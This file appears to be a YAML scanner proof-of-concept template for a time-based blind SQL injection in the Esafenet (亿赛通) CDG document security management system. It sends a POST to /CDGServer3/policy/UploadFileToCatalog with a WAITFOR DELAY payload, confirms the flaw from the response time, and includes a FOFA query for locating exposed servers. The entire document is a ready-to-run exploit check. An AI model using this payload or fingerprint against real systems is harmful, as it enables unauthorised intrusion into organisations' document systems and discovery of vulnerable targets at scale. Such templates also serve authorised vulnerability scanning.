id: poc-yaml-yisaitong-esafenet-uploadfiletocatalog-sqli
info:
  name: 亿赛通电子文档安全管理系统 UploadFileToCatalog SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 亿赛通电子文档安全管理系统
  fofa: body="/CDGServer3/index.jsp"
variables:
  t1: random_int(5,10)
  t2: t1 + 1
requests:
- method: POST
  path: /CDGServer3/policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: id=1';WAITFOR DELAY '0:0:{{.t1}}'--
  expression: status_code == 200 && contains(body,"CDGServer3") && !contains(body,"<html")
    && duration >= t1 && duration <= t2
transport: http
